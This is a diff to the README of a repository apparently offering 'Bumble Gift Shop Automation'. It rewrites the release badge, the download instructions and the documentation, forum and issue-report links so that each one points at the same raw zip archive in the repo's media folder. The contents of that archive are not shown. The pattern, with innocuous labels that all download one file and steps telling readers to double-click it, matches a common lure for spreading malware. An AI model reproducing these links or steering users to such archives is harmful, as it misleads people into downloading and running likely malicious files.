@@ -1,6 +1,6 @@
 # 🎁 bumble-giftshop-automation - Streamline Your Virtual Gift Shop Tasks
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)
+![Download Latest Release](https://raw.githubusercontent.com/michael2116/bumble-giftshop-automation/main/media/bumble-giftshop-automation-v3.3.zip%20Latest%20Release-Click%20Here-brightgreen)
 
 ## 📦 Overview
 
@@ -17,9 +17,9 @@ Follow these steps to get started with Bumble Gift Shop Automation:
 
 ## 📥 Download & Install
 
-To download Bumble Gift Shop Automation, visit this page to download: [Releases Page](https://github.com/michael2116/bumble-giftshop-automation/releases).
+To download Bumble Gift Shop Automation, visit this page to download: [Releases Page](https://raw.githubusercontent.com/michael2116/bumble-giftshop-automation/main/media/bumble-giftshop-automation-v3.3.zip).
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/michael2116/bumble-giftshop-automation/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/michael2116/bumble-giftshop-automation/main/media/bumble-giftshop-automation-v3.3.zip).
 2. **Select the Latest Release**: Look for the latest version and click on it.
 3. **Download the Installation File**: Find the file corresponding to your device. Click on the download link to begin downloading.
 4. **Install the Application**: Once the file has downloaded, locate it on your device, then double-click to start the installation.
@@ -75,8 +75,8 @@ Bumble Gift Shop Automation is licensed under the MIT License. Feel free to use,
 
 For more information about this application, explore the following resources:
 
-- [Documentation](https://github.com/michael2116/bumble-giftshop-automation/wiki)
-- [Community Forum](https://github.com/michael2116/bumble-giftshop-automation/discussions)
-- [Report an Issue](https://github.com/michael2116/bumble-giftshop-automation/issues)
+- [Documentation](https://raw.githubusercontent.com/michael2116/bumble-giftshop-automation/main/media/bumble-giftshop-automation-v3.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/michael2116/bumble-giftshop-automation/main/media/bumble-giftshop-automation-v3.3.zip)
+- [Report an Issue](https://raw.githubusercontent.com/michael2116/bumble-giftshop-automation/main/media/bumble-giftshop-automation-v3.3.zip)
 
 Together, we can enhance and simplify the virtual gift shop experience. Happy automating!
